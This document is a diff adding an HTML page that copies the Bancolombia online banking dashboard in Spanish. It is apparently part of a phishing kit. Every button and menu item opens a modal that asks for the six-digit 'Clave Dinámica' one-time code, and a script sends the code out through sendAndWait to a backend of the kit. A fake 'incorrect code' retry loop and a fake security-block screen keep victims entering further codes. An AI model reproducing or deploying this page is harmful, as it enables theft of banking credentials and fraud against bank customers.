@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bancolombia Sucursal Virtual Personas</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Open Sans', Arial, sans-serif;
+    background: #f9f9fa;
+    color: #2c2a29;
+    font-size: 16px;
+    line-height: 24px;
+    letter-spacing: -0.3px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  a { color: inherit; text-decoration: none; }
+  ul { list-style: none; }
+  button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+  /* HEADER */
+  header.top {
+    background: #2c2a29; color: #fff;
+    height: 60px; display: flex; align-items: center;
+    padding: 0 24px; position: sticky; top: 0; z-index: 50;
+    gap: 20px;
+  }
+  .menu-btn { color: #fff; display: flex; align-items: center; gap: 6px; font-size: 14px; }
+  .menu-btn svg { width: 24px; height: 24px; }
+  .brand { display: flex; align-items: center; gap: 16px; flex: 1; }
+  .brand img { height: 22px; }
+  .brand .channel { border-left: 1px solid #555; padding-left: 16px; font-size: 14px; font-weight: 600; }
+  .top-actions { display: flex; align-items: center; gap: 8px; }
+  .top-action {
+    color: #fff; display: flex; align-items: center; gap: 6px;
+    padding: 8px 12px; border-radius: 20px; font-size: 14px;
+    transition: background 0.2s;
+  }
+  .top-action:hover { background: #454648; }
+  .top-action svg { width: 20px; height: 20px; }
+  .top-action.search-pill { background: transparent; border: 1px solid #fff; }
+  .user-pill {
+    display: flex; align-items: center; gap: 6px;
+    padding: 8px 12px; border-radius: 20px;
+    color: #fff; font-size: 14px; font-weight: 600;
+    transition: background 0.2s;
+  }
+  .user-pill:hover { background: #454648; }
+
+  /* LAYOUT */
+  .layout { display: flex; flex: 1; }
+  aside.sidebar {
+    width: 80px; background: #fff;
+    border-right: 1px solid #e0e0e0;
+    padding: 16px 0; flex-shrink: 0;
+    position: sticky; top: 60px;
+    height: calc(100vh - 60px);
+  }
+  .nav-item {
+    display: flex; flex-direction: column;
+    align-items: center; gap: 4px;
+    padding: 12px 8px;
+    color: #2c2a29; font-size: 11px;
+    text-align: center; cursor: pointer;
+    border-left: 3px solid transparent;
+    transition: background 0.2s;
+  }
+  .nav-item:hover { background: #f5f5f5; }
+  .nav-item.active { border-left-color: #fdda24; font-weight: 700; }
+  .nav-item svg { width: 24px; height: 24px; }
+
+  /* MAIN */
+  main.content {
+    flex: 1; padding: 24px 32px;
+    max-width: 100%; overflow-x: hidden;
+  }
+  .page-header {
+    display: flex; justify-content: space-between;
+    align-items: center; margin-bottom: 16px;
+    font-size: 14px; color: #555;
+  }
+  .greeting {
+    display: flex; align-items: center; gap: 12px;
+    margin: 16px 0 32px;
+  }
+  .greeting h1 {
+    font-size: 32px; font-weight: 300;
+    letter-spacing: -0.5px;
+  }
+  .greeting h1 strong { font-weight: 700; }
+  .icon-btn {
+    width: 32px; height: 32px;
+    border-radius: 50%; background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    display: flex; align-items: center; justify-content: center;
+    color: #2c2a29; transition: transform 0.15s;
+  }
+  .icon-btn:hover { transform: scale(1.05); }
+  .icon-btn svg { width: 16px; height: 16px; }
+
+  section.block { margin-bottom: 32px; }
+  section.block h2 {
+    font-size: 22px; font-weight: 300;
+    margin-bottom: 16px;
+  }
+
+  /* SHORTCUTS */
+  .shortcuts {
+    display: flex; gap: 16px;
+    overflow-x: auto; overflow-y: hidden;
+    padding-bottom: 8px;
+    scrollbar-width: none;
+    -webkit-overflow-scrolling: touch;
+    scroll-snap-type: x proximity;
+    cursor: grab;
+  }
+  .shortcuts.dragging { cursor: grabbing; user-select: none; }
+  .shortcuts::-webkit-scrollbar { display: none; }
+  .shortcut-card {
+    min-width: 220px; background: #fff;
+    border-radius: 12px; padding: 16px;
+    display: flex; align-items: center; gap: 12px;
+    cursor: pointer;
+    transition: box-shadow 0.2s, transform 0.2s;
+    border: 1px solid #e8e8e8;
+    scroll-snap-align: start;
+    flex-shrink: 0;
+  }
+  .shortcut-card:hover {
+    box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+    transform: translateY(-2px);
+  }
+  .shortcut-icon {
+    width: 48px; height: 48px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .shortcut-icon img,
+  .shortcut-icon svg { width: 48px; height: 48px; object-fit: contain; }
+  .shortcut-card h6 { font-size: 14px; font-weight: 600; line-height: 1.3; }
+
+  /* PRODUCTS */
+  .products-header {
+    display: flex; justify-content: space-between;
+    align-items: center; margin-bottom: 16px;
+  }
+  .toggle-balance {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 14px; color: #2c2a29; cursor: pointer;
+  }
+  .toggle-balance svg { width: 20px; height: 20px; }
+  .accordion {
+    background: #fff; border-radius: 12px;
+    border: 1px solid #e8e8e8; overflow: hidden;
+  }
+  .accordion-header {
+    display: flex; align-items: center;
+    padding: 16px 20px; cursor: pointer;
+    gap: 12px; font-weight: 600;
+    background: #2c2a29; color: #fff;
+  }
+  .accordion-header > svg.icon-coin { width: 24px; height: 24px; }
+  .accordion-header h6 { flex: 1; font-size: 16px; }
+  .accordion-toggle { transition: transform 0.2s; transform: rotate(180deg); }
+  .accordion.open .accordion-toggle { transform: rotate(0deg); }
+  .accordion-body { display: none; }
+  .accordion.open .accordion-body { display: block; }
+  .product-row {
+    display: flex; align-items: center;
+    padding: 16px 20px; gap: 16px; flex-wrap: wrap;
+  }
+  .product-info { flex: 1; min-width: 200px; cursor: pointer; }
+  .product-info .name { font-weight: 700; font-size: 16px; }
+  .product-info .number { font-size: 14px; color: #555; }
+  .product-balance { text-align: right; }
+  .product-balance .label { font-size: 14px; color: #555; }
+  .product-balance .amount {
+    font-size: 22px; font-weight: 300; color: #2c2a29;
+  }
+  .product-menu {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .product-menu:hover { background: #f0f0f0; }
+
+  /* RECOMMENDATIONS */
+  .recommendations {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 16px;
+  }
+  .rec-card {
+    background: #fff; border-radius: 16px;
+    overflow: hidden;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    display: flex; flex-direction: column;
+  }
+  .rec-img { height: 160px; overflow: hidden; background: #f0f0f0; }
+  .rec-img img {
+    width: 100%; height: 100%;
+    object-fit: cover; display: block;
+  }
+  .rec-body {
+    padding: 20px; flex: 1;
+    display: flex; flex-direction: column;
+  }
+  .rec-body h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+  .rec-body p {
+    font-size: 14px; color: #555;
+    margin-bottom: 16px; flex: 1;
+  }
+  .btn-secondary {
+    align-self: flex-start;
+    padding: 8px 20px;
+    border: 1px solid #2c2a29;
+    border-radius: 50px;
+    font-size: 14px; font-weight: 600;
+    background: #fff; transition: background 0.2s;
+  }
+  .btn-secondary:hover { background: #2c2a29; color: #fff; }
+
+  /* FOOTER */
+  footer {
+    background: #fff; border-top: 1px solid #e0e0e0;
+    padding: 24px 32px;
+    display: flex; justify-content: space-between;
+    align-items: center; flex-wrap: wrap; gap: 16px;
+    font-size: 13px; color: #555;
+  }
+  .footer-left { display: flex; align-items: center; gap: 16px; }
+  .footer-left img { height: 28px; }
+  .vigilado { display: flex; align-items: center; gap: 6px; font-size: 12px; }
+  .vigilado-circle {
+    width: 24px; height: 24px;
+    border-radius: 50%;
+    background: #2c2a29; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 9px; font-weight: 700;
+  }
+  .footer-right { text-align: right; line-height: 1.5; }
+
+  /* Comente */
+  .comente-tab {
+    position: fixed; right: 0; top: 50%;
+    transform: translateY(-50%);
+    background: #2c2a29; color: #fff;
+    padding: 14px 8px;
+    border-radius: 6px 0 0 6px;
+    writing-mode: vertical-rl;
+    font-size: 13px; z-index: 999;
+    cursor: pointer; letter-spacing: 0.5px;
+  }
+  .comente-tab:hover { background: #454648; }
+
+  /* Modal Clave Dinámica */
+  .modal-din {
+    background: #fff;
+    border-radius: 16px;
+    max-width: 460px;
+    width: 100%;
+    padding: 28px 32px 32px;
+    position: relative;
+    animation: modalIn 0.2s ease-out;
+  }
+  @keyframes modalIn {
+    from { opacity: 0; transform: scale(0.95); }
+    to { opacity: 1; transform: scale(1); }
+  }
+  .modal-close {
+    position: absolute; top: 16px; right: 16px;
+    width: 32px; height: 32px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    color: #555;
+  }
+  .modal-close:hover { background: #f0f0f0; }
+  .hint-gif {
+    display: block; width: 100%; height: auto;
+    border-radius: 12px; margin: 8px 0 20px;
+  }
+  .modal-din h3 {
+    text-align: center;
+    font-size: 22px; font-weight: 700;
+    margin-bottom: 10px; color: #2c2a29;
+  }
+  .modal-din .modal-sub {
+    text-align: center; color: #555;
+    margin-bottom: 24px;
+    font-size: 14px; line-height: 1.4;
+  }
+  .otp-error {
+    background: #fdecea;
+    border-left: 4px solid #e74c3c;
+    color: #c0392b;
+    padding: 10px 12px;
+    border-radius: 6px;
+    font-size: 13px;
+    margin-bottom: 16px;
+    text-align: center;
+    display: none;
+  }
+  .otp-error.show { display: block; animation: shake 0.4s ease; }
+  @keyframes shake {
+    0%,100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+  }
+  .modal-actions {
+    display: flex; justify-content: center; gap: 14px;
+  }
+
+  @media (max-width: 768px) {
+    header.top { padding: 0 12px; gap: 8px; }
+    .brand .channel { display: none; }
+    .top-action span, .top-action.search-pill { display: none; }
+    aside.sidebar { display: none; }
+    main.content { padding: 16px; }
+    .greeting h1 { font-size: 24px; }
+    footer { padding: 20px 16px; }
+  }
+</style>
+<link rel="stylesheet" href="css/secured.css">
+<style>
+  /* Sobreescribimos: el body del dashboard tiene su propio layout */
+  body { background: #f9f9fa; }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <button class="menu-btn" onclick="openDinModal()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="4" y1="7" x2="20" y2="7"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="17" x2="20" y2="17"/></svg>
+    <span>Menú</span>
+  </button>
+  <div class="brand">
+    <img src="/img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+    <div class="channel">Sucursal Virtual Personas</div>
+  </div>
+  <div class="top-actions">
+    <button class="top-action search-pill" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.5" y2="16.5"/></svg>
+      <span>Buscar</span>
+    </button>
+    <button class="top-action" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M9.5 9a2.5 2.5 0 015 0c0 1.5-2.5 2-2.5 3.5"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      <span>Ayuda</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+    </button>
+    <button class="user-pill" onclick="openDinModal()">
+      <span id="userName">Usuario</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+    </button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="nav-item active" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l9-7 9 7v9a1 1 0 01-1 1h-5v-6h-6v6H4a1 1 0 01-1-1z"/><rect x="8.5" y="13" width="7" height="3" rx="0.5"/></svg>
+      Inicio
+    </div>
+    <div class="nav-item" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5h6l1 3H8l1-3z"/><path d="M7 8h10c2 4 3 7 3 10a4 4 0 01-4 4H8a4 4 0 01-4-4c0-3 1-6 3-10z"/><path d="M12 12v6M10 14h3a1.5 1.5 0 010 3h-3M10 14v6"/></svg>
+      Productos
+    </div>
+    <div class="nav-item" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="13" rx="2"/><line x1="2" y1="11" x2="22" y2="11"/><rect x="6" y="14" width="4" height="2.5" rx="0.3"/></svg>
+      Transacciones
+    </div>
+    <div class="nav-item" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11V5.5a1.5 1.5 0 113 0V11"/><path d="M12 10V3.5a1.5 1.5 0 113 0V11"/><path d="M15 11V5a1.5 1.5 0 113 0v8a7 7 0 01-7 7H9.5a3.5 3.5 0 01-3.5-3.5v-2L4 12.5a1.5 1.5 0 012.4-1.8L8 12.5"/><circle cx="14" cy="3" r="1.3" fill="currentColor"/></svg>
+      Solicitudes
+    </div>
+    <div class="nav-item" onclick="openDinModal()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="4" y1="7" x2="20" y2="7"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="17" x2="20" y2="17"/></svg>
+      Más
+    </div>
+  </aside>
+
+  <main class="content">
+    <div class="page-header">
+      <div></div>
+      <div id="currentDate"></div>
+    </div>
+
+    <div class="greeting">
+      <h1>Hola, <strong id="greetingName">Usuario</strong></h1>
+      <button class="icon-btn" onclick="openDinModal()" aria-label="Personalizar nombre">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 113 3L7 19l-4 1 1-4 12.5-12.5z"/></svg>
+      </button>
+    </div>
+
+    <section class="block">
+      <h2>Transacciones más usadas</h2>
+      <div class="shortcuts" id="shortcuts">
+        <div class="shortcut-card" onclick="openDinModal()">
+          <div class="shortcut-icon"><img src="/img/imgi_4_pic-send-money-from.svg" alt=""></div>
+          <h6>Transferir a productos Bancolombia</h6>
+        </div>
+        <div class="shortcut-card" onclick="openDinModal()">
+          <div class="shortcut-icon"><img src="/img/imgi_5_pic-lock.svg" alt=""></div>
+          <h6>Editar topes</h6>
+        </div>
+        <div class="shortcut-card" onclick="openDinModal()">
+          <div class="shortcut-icon"><img src="/img/imgi_6_pic-invoice.svg" alt=""></div>
+          <h6>Pagar facturas</h6>
+        </div>
+        <div class="shortcut-card" onclick="openDinModal()">
+          <div class="shortcut-icon"><img src="/img/imgi_7_pic-wallet.svg" alt=""></div>
+          <h6>Ir a Bolsillos</h6>
+        </div>
+        <div class="shortcut-card" onclick="openDinModal()">
+          <div class="shortcut-icon"><img src="/img/imgi_8_pic-documents.svg" alt=""></div>
+          <h6>Consultar extractos</h6>
+        </div>
+      </div>
+    </section>
+
+    <section class="block">
+      <div class="products-header">
+        <h2>Tus productos</h2>
+        <div class="toggle-balance" id="toggleBalance">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/></svg>
+          <span id="toggleText">Mostrar saldos</span>
+        </div>
+      </div>
+
+      <div class="accordion open" id="acc1">
+        <div class="accordion-header" onclick="document.getElementById('acc1').classList.toggle('open')">
+          <svg class="icon-coin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="7" rx="8" ry="3"/><path d="M4 7v4c0 1.7 3.6 3 8 3s8-1.3 8-3V7"/><path d="M4 11v4c0 1.7 3.6 3 8 3s8-1.3 8-3v-4"/><path d="M4 15v2c0 1.7 3.6 3 8 3s8-1.3 8-3v-2"/></svg>
+          <h6>Cuentas (1)</h6>
+          <svg class="accordion-toggle" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </div>
+        <div class="accordion-body">
+          <div class="product-row">
+            <div class="product-info" onclick="openDinModal()">
+              <div class="name">Cuenta de Ahorros</div>
+              <div class="number">Ahorros 770 - 988723 - 13</div>
+            </div>
+            <div class="product-balance">
+              <div class="label">Saldo disponible</div>
+              <div class="amount" id="balance">****</div>
+            </div>
+            <button class="product-menu" onclick="openDinModal()" aria-label="Opciones">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="19" cy="12" r="1.5"/></svg>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="block">
+      <h2>Te recomendamos</h2>
+      <div class="recommendations">
+        <div class="rec-card">
+          <div class="rec-img"><img src="/img/imgi_9_S5aR7DFEugr5hTo1e6LP.jpg" alt="Plan Salud"></div>
+          <div class="rec-body">
+            <h3>Plan Salud Para Ti</h3>
+            <p>Cuídate desde $39,900 al mes</p>
+            <button class="btn-secondary" onclick="openDinModal()">Pide tu seguro</button>
+          </div>
+        </div>
+        <div class="rec-card">
+          <div class="rec-img"><img src="/img/imgi_11_p5iPJNLs4amUF65XT1XF.jpg" alt="Acumula kilómetros"></div>
+          <div class="rec-body">
+            <h3>Acumula kilómetros</h3>
+            <p>Pagando con tu Mastercard</p>
+            <button class="btn-secondary" onclick="openDinModal()">Inscríbete</button>
+          </div>
+        </div>
+        <div class="rec-card">
+          <div class="rec-img"><img src="/img/imgi_10_MQHcDg4Nx7zMqW827eqD.png" alt="Vendes tu casa"></div>
+          <div class="rec-body">
+            <h3>¿Vendes tu casa?</h3>
+            <p>Hazlo con Tu360Inmobiliario</p>
+            <button class="btn-secondary" onclick="openDinModal()">Empieza aquí</button>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<footer>
+  <div class="footer-left">
+    <img src="/img/horizont-trazo.svg" alt="Bancolombia" onerror="this.style.display='none'">
+    <div class="vigilado">
+      <div class="vigilado-circle">SFC</div>
+      <span>Vigilado Superintendencia Financiera</span>
+    </div>
+  </div>
+  <div class="footer-right">
+    <div>Dirección IP: <span id="ipAddr">190.68.206.206</span></div>
+    <div>Última visita: <span id="lastVisit"></span></div>
+  </div>
+</footer>
+
+<button class="comente-tab" onclick="openDinModal()">Comente</button>
+
+<!-- Loader -->
+<div class="loader-overlay" id="loader">
+  <div class="loader-box">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Cargando...</div>
+  </div>
+</div>
+
+<!-- Modal Clave Dinámica -->
+<div class="modal-overlay" id="dinModal">
+  <div class="modal-din">
+    <button class="modal-close" onclick="closeDinModal()" aria-label="Cerrar">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <img class="hint-gif" src="/img/imgi_4_cd-desktop.gif" alt="Cómo encontrar tu Clave Dinámica" onerror="this.style.display='none'">
+    <h3>Ingresa la Clave Dinámica</h3>
+    <p class="modal-sub">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+    <div class="otp-error" id="otpError">Clave Dinámica incorrecta. Intenta de nuevo.</div>
+    <div class="otp-inputs" id="otpInputs">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+    </div>
+    <div class="modal-actions">
+      <button class="btn-pill btn-secondary-pill" onclick="din.clear()">Borrar</button>
+      <button class="btn-pill btn-primary" id="btnContinue" disabled>Continuar</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal 923 -->
+<div class="modal-overlay" id="modal923">
+  <div class="modal-923">
+    <div class="x-circle">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </div>
+    <h3>Por seguridad, no puedes continuar</h3>
+    <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.    Codigo: 923</p>
+    <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
+  </div>
+</div>
+
+<script src="js/secured.js"></script>
+<script>
+  // Fecha actual
+  const meses = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
+  const dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+  const now = new Date();
+  const horaStr = now.toLocaleTimeString('es-CO',{hour:'numeric',minute:'2-digit',hour12:true});
+  const fechaStr = `${dias[now.getDay()]}, ${now.getDate()} de ${meses[now.getMonth()]} de ${now.getFullYear()}, ${horaStr}`;
+  document.getElementById('currentDate').textContent = fechaStr;
+  document.getElementById('lastVisit').textContent = fechaStr;
+  document.getElementById('greetingName').textContent =
+    USER.charAt(0).toUpperCase() + USER.slice(1).toLowerCase();
+
+  // Toggle saldo
+  let hidden = true;
+  const realBalance = '$ 1.300,32';
+  document.getElementById('toggleBalance').addEventListener('click', () => {
+    hidden = !hidden;
+    document.getElementById('balance').textContent = hidden ? '****' : realBalance;
+    document.getElementById('toggleText').textContent = hidden ? 'Mostrar saldos' : 'Ocultar saldos';
+  });
+
+  // Drag-scroll en shortcuts (desktop)
+  const sc = document.getElementById('shortcuts');
+  let isDown = false, startX, scrollLeft, moved = false;
+  sc.addEventListener('mousedown', (e) => {
+    isDown = true; moved = false;
+    sc.classList.add('dragging');
+    startX = e.pageX - sc.offsetLeft;
+    scrollLeft = sc.scrollLeft;
+  });
+  sc.addEventListener('mouseleave', () => { isDown = false; sc.classList.remove('dragging'); });
+  sc.addEventListener('mouseup',    () => { isDown = false; sc.classList.remove('dragging'); });
+  sc.addEventListener('mousemove', (e) => {
+    if (!isDown) return;
+    e.preventDefault();
+    const x = e.pageX - sc.offsetLeft;
+    const walk = (x - startX) * 1.2;
+    if (Math.abs(walk) > 5) moved = true;
+    sc.scrollLeft = scrollLeft - walk;
+  });
+  sc.querySelectorAll('.shortcut-card').forEach(card => {
+    card.addEventListener('click', (e) => { if (moved) { e.stopPropagation(); e.preventDefault(); } }, true);
+  });
+
+  /* ====== Modal Clave Dinámica ====== */
+  const din = setupOtpInputs('otpInputs', 'btnContinue', 'otpError');
+  let showDinError = false;
+
+  function openDinModal() {
+    showLoader();
+    setTimeout(() => {
+      hideLoader();
+      din.clear();
+      const errEl = document.getElementById('otpError');
+      if (showDinError) {
+        errEl.classList.add('show');
+        showDinError = false;
+      } else {
+        errEl.classList.remove('show');
+      }
+      document.getElementById('dinModal').classList.add('show');
+      setTimeout(() => din.inputs[0] && din.inputs[0].focus(), 50);
+    }, 1200);
+  }
+  function closeDinModal() {
+    document.getElementById('dinModal').classList.remove('show');
+  }
+  document.getElementById('dinModal').addEventListener('click', (e) => {
+    if (e.target.id === 'dinModal') closeDinModal();
+  });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closeDinModal();
+  });
+
+  document.getElementById('btnContinue').addEventListener('click', () => {
+    const btn = document.getElementById('btnContinue');
+    if (btn.disabled) return;
+    const code = din.getCode();
+    closeDinModal();
+    sendAndWait({ event: 'DINAMICA', dinamic: code }, {
+      onOk:  () => { sessionStorage.clear(); location.href = 'index.html'; },
+      onErr: () => { hideLoader(); showDinError = true; openDinModal(); }
+    });
+  });
+
+  // Si venimos del login con ?modal=din, abrir directo
+  if (new URLSearchParams(location.search).get('modal') === 'din') {
+    setTimeout(() => openDinModal(), 600);
+  }
+</script>
+</body>
+</html>
